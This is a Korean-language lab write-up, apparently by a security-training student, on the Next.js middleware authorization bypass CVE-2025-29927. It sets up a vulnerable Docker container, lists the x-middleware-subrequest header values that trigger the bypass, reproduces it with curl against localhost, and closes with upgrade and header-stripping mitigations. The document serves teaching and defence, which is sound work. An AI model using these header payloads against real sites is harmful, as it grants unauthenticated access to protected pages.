# Next.js Middleware Authorization Bypass (CVE-2025-29927)
> 화이트햇스쿨 3기 17반 박민영

## 1. Next.js 미들웨어 인증 우회 취약점이란?
이 취약점은 Next.js 웹 프레임워크에서 발생하는 보안 취약점으로, 공격자가 미들웨어 기반의 인증 절차를 우회하여 시스템에 접근할 수 있게 한다.
공격자는 특정 값을 가진 `x-middleware-subrequest` 헤더를 추가함으로써 미들웨어를 우회할 수 있으며, 이를 통해 인증되지 않은 사용자가 인증이 필요한 페이지에 무단으로 접속하여 공격할 수 있다. 

### 공격 예시
프레임워크의 버전에 따라 아래와 같은 값을 요청에 추가하면 미들웨어를 우회할 수 있다.</br>
`x-middleware-subrequest: pages/_middleware`</br>
`x-middleware-subrequest: middleware`</br>
`x-middleware-subrequest: src/middleware`</br>
`x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`</br>

## 2. 취약한 환경 구성
1. `docker compose up -d` 명령어로 Next.js 15.2.2 버전의 컨테이너를 시작한다.
![image](https://github.com/user-attachments/assets/cb593947-95c8-409a-a8fe-14a060a002b9)

2. `docker ps` 명령어로 실행 중인 컨테이너 목록을 확인한다.
![image](https://github.com/user-attachments/assets/3a299e89-c961-4c5e-95dd-bc635b6f3285)

3. 애플리케이션이 시작되면, `http://localhost:3000` 주소를 방문할 때 로그인 페이지로 리디렉션된다.</br>
![image](https://github.com/user-attachments/assets/3c800e3f-83be-4bee-bdbb-ad36c1a634d1)

 `admin/password`를 입력하여 로그인하면 대시보드에 접근할 수 있다.
   ![image](https://github.com/user-attachments/assets/a1c21614-a455-49cc-b57d-417ff6902541)
   
## 3. 취약점 재현
- 인증 과정 없이 대시보드에 접근하려고 하면 로그인 페이지로 리디렉션된다.

```bash
curl -i http://localhost:3000
```

![image](https://github.com/user-attachments/assets/d3cd332d-90de-4321-82cb-0ea673eef2a9)

- http 요청에 `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` 값을 추가하면 미들웨어를 우회하여, 인증 없이 대시보드에 접근할 수 있다.

```bash
curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000
```

  ![image](https://github.com/user-attachments/assets/5708f8fc-7299-4806-aeb0-8f9a093c769f)

## 4. 취약점 대처 방안
해당 취약점이 수정된 버전으로 업그레이드하여 사용하여야 한다.
- Next.js 15.x → 15.2.3
- Next.js 14.x → 14.2.25
  
업그레이드하지 못하거나 아래의 버전의 경우 `x-middleware-subrequest` 헤더가 포함된 외부 요청이 애플리케이션에 도달하지 못하도록 해당 헤더를 제거하거나 차단하도록 구성하여야 한다.
- Next.js 11.1.4~13.5.6 

## 5. 참고자료
[vulhub/next.js/CVE-2025-29927(영어)
](https://github.com/vulhub/vulhub/tree/master/next.js/CVE-2025-29927/README.md)</br>
[vulhub/next.js/CVE-2025-29927(중국어)](https://github.com/vulhub/vulhub/tree/master/next.js/CVE-2025-29927/README.zh-cn.md)</br>
[CVE-2025-29927: Next.js Middleware Authorization Bypass - Technical Analysis](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)</br>
[Next.js and the corrupt middleware: the authorizing artifact](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware)
